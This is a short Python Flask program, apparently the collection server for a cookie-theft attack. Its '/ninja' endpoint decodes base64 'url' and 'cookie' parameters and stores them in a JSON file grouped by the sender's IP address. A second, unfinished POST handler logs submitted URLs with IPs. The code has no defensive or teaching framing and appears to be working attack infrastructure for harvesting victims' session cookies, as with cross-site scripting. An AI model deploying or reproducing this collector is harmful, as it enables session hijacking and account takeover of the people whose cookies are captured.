from flask import Flask
from flask import request
import sys
import base64
import json
import os

app = Flask(__name__)


@app.route('/')
def hello_world():
    '''
    That's only for checking out if the server's running
    '''
    return 'Hello World!'


@app.route('/ninja', methods=['POST', 'GET'])
def ninja():
    '''
    Function who gets the arguments from http requests 
    '''
    
    # Case of GET methods
    if request.method == 'GET':

        # Get the data from the http request
        url = base64.b64decode(request.args.get('url')).decode('ascii')
        cookies = base64.b64decode(request.args.get('cookie')).decode('ascii')

        # Here we'll store as a JSon object the data we will get
        data = {}
        with open('/home/ultrae/FLASK_TEST/here.json', "r") as file:
            # Check if the file is empty
            if os.stat('/home/ultrae/FLASK_TEST/here.json').st_size != 0:
                data = json.load(file)

        with open('/home/ultrae/FLASK_TEST/here.json', "w") as file:
            # We want to stock data by IP addresses

            if not request.remote_addr in data:
                data[request.remote_addr] = [
                    {"url": url, "cookies": cookies.strip(";")}]
            else:
                data[request.remote_addr].append(
                    {"url": url, "cookies": cookies.strip(";")})
            json.dump(data, file)

        return 'GET'

    # Case of POST methods
    # Not working yet !
    if request.method == 'POST':
        url = request.data
        url = url.decode('ascii')
        with open('/home/ultrae/FLASK_TEST/here', "a") as file:
            file.write(url + " " + request.remote_addr + '\n')
        return 'POST'

    return 'error'


if __name__ == '__main__':
    app.run()
